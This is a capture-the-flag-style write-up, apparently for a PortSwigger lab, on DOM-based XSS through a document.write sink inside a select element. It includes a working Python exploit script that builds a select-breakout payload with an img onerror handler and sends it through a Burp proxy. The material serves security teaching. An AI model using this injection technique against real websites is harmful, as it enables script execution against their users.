@@ -1,0 +1,137 @@
+---
+title: 'XSS Lab 10'
+description: 'DOM XSS in document.write sink using location.search inside a select element'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## DOM XSS in document.write sink using source location.search inside a select element
+
+<div style="text-align: justify;">
+  This lab demonstrates a DOM-based cross-site scripting (XSS) vulnerability where unsanitized data from `location.search` is passed into `document.write`, which creates an `<option>` inside a `<select>` element. Because the attacker controls the `storeId` query parameter in the URL, they can inject payloads that break out of the `<select>` and execute JavaScript (for example, via an `<img onerror>`), triggering `alert(1)` to solve the lab.
+
+  The exploit workflow is to craft a URL that contains a `storeId` value which closes the open `<option>`/`<select>` context, injects an HTML element with an event that runs JavaScript, then open that URL in a browser to allow the DOM write to execute the injected markup.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The application reads `storeId` from `location.search` and uses `document.write` to create an `<option>` inside a `<select>` element.
+- Because the value is not properly escaped, a payload can close the `<select>`/`option` context and inject new HTML.
+- The injected HTML includes a tag with a JavaScript-triggering attribute (e.g. `<img onerror=...>`).
+- Opening the modified URL in a browser causes the `document.write` to run and the injected element to execute JavaScript (alert).
+- This is a pure DOM XSS — server responses may not contain the final injected markup; the browser builds it at runtime.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import sys
+import requests
+import urllib3
+import urllib.parse
+
+# -------------------------
+# Config / defaults
+# -------------------------
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+DEFAULT_PRODUCT_ID = 1
+TIMEOUT = 8
+
+# -------------------------
+# Helpers
+# -------------------------
+def check_burp(timeout: int = 2) -> None:
+    """Ensure Burp is reachable on the default proxy. Exit if not."""
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=timeout)
+    except requests.exceptions.RequestException:
+        print("[-] Burp Suite not reachable at 127.0.0.1:8080. Start Burp or update PROXIES in the script.")
+        sys.exit(1)
+
+def payload() -> str:
+    """Raw XSS payload (break out of <select> and trigger alert)."""
+    return '"></select><img src=1 onerror=alert(1)>'
+
+def build_exploit_url(base: str, product_id: int = DEFAULT_PRODUCT_ID) -> str:
+    """
+    Build exploit URL:
+      <base>/product?productId=<N>&storeId=<url-encoded-payload>
+    """
+    base = base.rstrip("/")
+    p = payload()
+    encoded = urllib.parse.quote(p, safe="")
+    return f"{base}/product?productId={product_id}&storeId={encoded}"
+
+def quick_check(url: str, use_proxy: bool = True) -> bool:
+    """
+    GET the URL and try to detect reflection of the payload (or fragments).
+    Returns True if likely reflected in server response; False otherwise.
+    """
+    try:
+        resp = requests.get(url, allow_redirects=False, verify=False, timeout=TIMEOUT,
+                            proxies=(PROXIES if use_proxy else {}))
+    except requests.exceptions.RequestException as e:
+        print(f"[-] HTTP request failed: {e}")
+        sys.exit(1)
+
+    print(f"[+] HTTP {resp.status_code} received. Response length: {len(resp.text)} bytes")
+
+    raw_payload = payload()
+    # direct verbatim check
+    if raw_payload in resp.text:
+        print("[+] Payload found verbatim in response body.")
+        return True
+
+    # fragment checks: useful when some characters get encoded
+    fragments = ['"></select>', 'onerror=alert', '<img', 'storeId=']
+    for frag in fragments:
+        if frag in resp.text:
+            print(f"[+] Payload fragment detected in response body: {frag}")
+            return True
+
+    print("[-] No obvious reflection detected in server response (it may still be injected into DOM at runtime).")
+    return False
+
+# -------------------------
+# Main
+# -------------------------
+def main() -> None:
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <base-url>")
+        sys.exit(1)
+
+    base = sys.argv[1].strip().rstrip("/")
+    print(f"[*] Target: {base}")
+    print("[*] Using Burp proxy: yes (127.0.0.1:8080). Edit PROXIES to change.")
+
+    # check Burp (keeps behavior consistent with your previous scripts)
+    print("[*] Checking Burp proxy...")
+    check_burp()
+    print("[+] Burp proxy reachable.")
+
+    # build & display exploit URL
+    exploit_url = build_exploit_url(base)
+    print(f"[+] Exploit URL:\n{exploit_url}")
+
+    # quick reflection check
+    print("[*] Performing quick GET to check reflection (will NOT execute JS)...")
+    reflected = quick_check(exploit_url, use_proxy=True)
+    if reflected:
+        print("[+] Reflection likely — open the URL in a browser to trigger the DOM XSS (alert).")
+    else:
+        print("[-] Reflection not obvious in response. It still may be exploitable only in DOM; open the URL in a browser and inspect the select/options.")
+
+    print("\n[*] Done. Note: to actually see the alert(1) you must open the URL in a browser or use a JS-capable automation tool (Selenium/Playwright).")
+
+if __name__ == "__main__":
+    main()
+```
